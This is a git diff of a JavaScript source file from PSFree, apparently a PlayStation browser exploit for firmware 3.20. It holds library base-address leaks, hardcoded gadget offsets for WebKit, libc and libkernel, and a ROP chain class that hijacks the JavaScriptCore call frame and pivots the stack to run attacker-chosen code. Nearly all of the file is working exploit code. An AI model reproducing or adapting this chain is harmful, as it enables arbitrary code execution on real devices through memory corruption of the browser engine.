@@ -1,20 +1,39 @@
-import { mem } from "../../module/mem.mjs";
-import { KB } from "../../module/offset.mjs";
-import { ChainBase, get_gadget } from "../../module/chain.mjs";
-import { BufferView } from "../../module/rw.mjs";
+/* Copyright (C) 2023-2025 anonymous
 
-import { get_view_vector, resolve_import, init_syscall_array } from "../../module/memtools.mjs";
+This file is part of PSFree.
+
+PSFree is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
+
+PSFree is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+
+// Thanks to abc for the insights into JSC and the idea to pivot using topCallFrame
+// most offsets from: https://github.com/ChendoChap/PS5-Webkit-Execution
+// finding topCallFrame: https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html
+
+// 3.20
+// heavily referencing code from 4.03 chain by idlesauce
+// syscall_map was taken from https://github.com/idlesauce/umtx2
+// chain created by @p4rad0xical
+
+import { mem } from "../../module/mem.mjs";
+import { ChainBase } from "../../module/chain.mjs";
 
 import * as off from "../../module/offset.mjs";
-import { hex } from "../../module/utils.mjs";
 
 const offset_wk_memset_import = 0x028DDEB8;
-const offset_wk_stack_chk_guard_import = 0x028DDB98;
+const offset_wk___stack_chk_guard_import = 0x028DDB98;
 
 const offset_lk_stack_chk_guard = 0x00069190;
 const offset_lc_memset = 0x00014B50;
-
-export const gadgets = new Map();
 
 // libSceNKWebKit.sprx
 export let libwebkit_base = null;
@@ -28,9 +47,9 @@ export let libc_base = null;
 // When the scrollLeft getter native function is called on the console, rsi is
 // the JS wrapper for the WebCore textarea class.
 const jop1 = `
-mov rdi, qword ptr [rsi + 0x18]
+mov rdi, qword ptr [rsi + 0x10]
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0xb8]
+call qword ptr [rax + 0x18]
 `;
 // Since the method of code redirection we used is via redirecting a call to
 // jump to our JOP chain, we have the return address of the caller on entry.
@@ -427,17 +446,18 @@ let webkit_gadget_offsets = new Map(
     "mov dword ptr [rdi], eax; ret": 0x000000000003469f, // `89 07 c3`
     // not present in webkit, libc, and libkernel
     // "mov dword ptr [rax], esi; ret": 0x000000000109b1f0, // `89 30 c3`
+    "mov dword ptr [rax], ecx; ret": 0x0000000000404ef5, // `89 08 c3`
 
 
     // TODO: none of the JOPs except the last one are valid. Need to learn and find these, potentially rewrite.  
-    [jop1]: 0x00000000004e62a4, // `48 8b 7e 18 48 8b 07 ff 90 b8 00 00 00`
-    [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
-    [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
+    // [jop1]: 0x00000000002dfd59, //
+    // [jop2]: 0x00000000021fce7e, // `5e ff 60 1c`
+    // [jop3]: 0x00000000019becb4, // `48 8b 78 08 48 8b 07 ff 60 30`
 
-    [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
-    [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
-    [jop6]: 0x00000000028bd332, // `52 ff 20`
-    [jop7]: 0x0000000000099a22, // `5c c3`
+    // [jop4]: 0x0000000000683800, // `55 48 89 e5 48 8b 07 ff 50 58`
+    // [jop5]: 0x0000000000303906, // `48 8b 50 18 48 8b 07 ff 50 10`
+    // [jop6]: 0x00000000028bd332, // `52 ff 20`
+    // [jop7]: 0x0000000000099a22, // `5c c3`
   }),
 );
 
@@ -459,6 +479,7 @@ const libkernel_gadget_offsets = new Map(
   }),
 );
 
+export const gadgets = new Map();
 
 function get_bases() {
   const textarea = document.createElement("textarea");
@@ -467,7 +488,7 @@ function get_bases() {
   const off_ta_vt = 0x02762860;
   const libwebkit_base = textarea_vtable.sub(off_ta_vt);
 
-  const stack_chk_guard_import = libwebkit_base.add(offset_wk_stack_chk_guard_import);
+  const stack_chk_guard_import = libwebkit_base.add(offset_wk___stack_chk_guard_import);
   const stack_chk_guard_addr = stack_chk_guard_import.readp(0);
   const libkernel_base = stack_chk_guard_addr.sub(offset_lk_stack_chk_guard);
 
@@ -478,21 +499,13 @@ function get_bases() {
   return [libwebkit_base, libkernel_base, libc_base];
 }
 
-function crash(addr) {
-  let x = 0x32;
-  while (true) {
-    addr.readp(x);
-    x += x;
-  }
-}
-
 export function init_gadget_map(gadget_map, offset_map, base_addr) {
   for (const [insn, offset] of offset_map) {
     gadget_map.set(insn, base_addr.add(offset));
   }
 }
 
-export function init_syscalls(syscall_array, libkernel_web_base, syscall_map) {
+function init_syscall_map(syscall_array, libkernel_web_base, syscall_map) {
   for (let sysc in syscall_map) {
     syscall_array[sysc] = libkernel_web_base.add(syscall_map[sysc]);
   }
@@ -502,6 +515,14 @@ export function init_syscalls(syscall_array, libkernel_web_base, syscall_map) {
 class Chain320Base extends ChainBase {
   push_end() {
     this.push_gadget("leave; ret");
+  }
+
+  push_write8(addr, value) {
+    this.push_gadget("pop rdi; ret");
+    this.push_value(addr);
+    this.push_gadget("pop rax; ret");
+    this.push_value(value);
+    this.push_gadget("mov qword ptr [rdi], rax; ret");
   }
 
   push_get_retval() {
@@ -522,25 +543,58 @@ class Chain320Base extends ChainBase {
 
   push_clear_errno() {
     this.push_call(this.get_gadget("__error"));
-    this.push_gadget("pop rsi; ret");
+    this.push_gadget("pop rcx; ret");
     this.push_value(0);
     // TODO: most things will return 0 because of this missing gadget.
-    this.push_gadget("mov dword ptr [rax], esi; ret");
+    this.push_gadget("mov dword ptr [rax], ecx; ret");
   }
 }
 
 export class Chain320 extends Chain320Base {
   constructor() {
-    super(0x2000);
-    const [rdx, rdx_bak] = mem.gc_alloc(0x58);
-    rdx.write64(off.js_cell, this._empty_cell);
-    rdx.write64(0x50, this.stack_addr);
-    this._rsp = mem.fakeobj(rdx);
+    super();
+    const global = Function('return this')();
+    const js_glob_obj_addr = mem.addrof(global);
+    const glob_obj_addr = js_glob_obj_addr.readp(16);
+    const vm_addr = glob_obj_addr.readp(56);
+
+    // pattern: 48 89 A6 ?? ?? 00 00  48 89 AE ?? ?? 00 00  48 83 C4 10  FF D7  48 83 EC 10  49 89 E8
+    // 1.00-2.70 = 0xB140
+    // 3.00-5.50 = 0x9EE0
+    this.rbp_ptr = vm_addr.add(0x9EE0);
+
+    const launch_i = function () {
+      const rbp = this.rbp_ptr.readp(0);
+
+      const return_address_ptr = rbp.add(8);
+      const original_return_address = return_address_ptr.readp(0);
+      const stack_pointer_ptr = return_address_ptr.add(8);
+      const original_stack_pointer = stack_pointer_ptr.readp(0);
+
+      // these are here not push_end because of the thing described below
+
+      // push_write8 clobbers rax so this must be done first
+      this.push_write8(return_address_ptr, original_return_address);
+      this.push_write8(stack_pointer_ptr, original_stack_pointer);
+
+      this.push_gadget("pop rax; ret");
+      this.push_value(0x0a); // js undefined https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.1.2-macOS-11.6.5/Source/JavaScriptCore/runtime/JSCJSValue.h#L428
+
+      this.push_gadget("pop rsp; ret");
+      this.push_value(return_address_ptr);
+
+      return_address_ptr.write64(0, this.get_gadget("pop rsp; ret"));
+      stack_pointer_ptr.write64(0, this.stack_addr);
+    }
+
+    // JSC only updates the topCallFrame rbp when it switches from native calls to JS code
+    // calling a bound function will update rbp, calling through eval seems to work too
+    this.launch_w = launch_i.bind(this);
   }
 
   run() {
     this.check_allow_run();
-    this._rop.launch = this._rsp;
+    this.launch_w();
     this.dirty();
   }
 }
@@ -554,54 +608,7 @@ export function init(Chain) {
   init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
   init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
   init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
-  init_syscalls(syscall_array, libkernel_base, syscall_map);
-
-  // NOTE: all of gs is vodoo to me.
-  let gs = Object.getOwnPropertyDescriptor(window, "location").set;
-  // JSCustomGetterSetter.m_getterSetter | readp(offset = 0x28) returns 0x1, which causes page fault. No idea what should be the correct value.
-  gs = mem.addrof(gs).readp(0x18);
-  // 0x18 "works", idk what the implications for this is yet, but time to find out.
-
-  // sizeof JSC::CustomGetterSetter
-  const size_cgs = 0x18;
-  const [gc_buf, gc_back] = mem.gc_alloc(size_cgs);
-  mem.cpy(gc_buf, gs, size_cgs);
-  // JSC::CustomGetterSetter.m_setter
-  // gc_buf.write64(0x10, get_gadget(gadgets, jop1));
-
-  const proto = Chain.prototype;
-  // _rop must have a descriptor initially in order for the structure to pass
-  // setHasReadOnlyOrGetterSetterPropertiesExcludingProto() thus forcing a
-  // call to JSObject::putInlineSlow(). putInlineSlow() is the code path that
-  // checks for any descriptor to run
-  //
-  // the butterfly's indexing type must be something the GC won't inspect
-  // like DoubleShape. it will be used to store the JOP table's pointer
-  const _rop = {
-    get launch() {
-      throw Error("never call");
-    },
-    0: 1.1,
-  }
-  // replace .launch with the actual custom getter/setter
-  mem.addrof(_rop).write64(off.js_inline_prop, gc_buf);
-  proto._rop = _rop;
-
-  // JOP table
-  const rax_ptrs = new BufferView(0x100);
-  const rax_ptrs_p = get_view_vector(rax_ptrs);
-  proto._rax_ptrs = rax_ptrs;
-
-  // rax_ptrs.write64(0x70, get_gadget(gadgets, jop2));
-  // rax_ptrs.write64(0x30, get_gadget(gadgets, jop3));
-  // rax_ptrs.write64(0x40, get_gadget(gadgets, jop4));
-  // rax_ptrs.write64(0, get_gadget(gadgets, jop5));
-
-  const jop_buffer_p = mem.addrof(_rop).readp(off.js_butterfly);
-  jop_buffer_p.write64(0, rax_ptrs_p);
-
-  const empty = {};
-  proto._empty_cell = mem.addrof(empty).read64(off.js_cell);
+  init_syscall_map(syscall_array, libkernel_base, syscall_map);
 
   Chain.init_class(gadgets, syscall_array);
 }
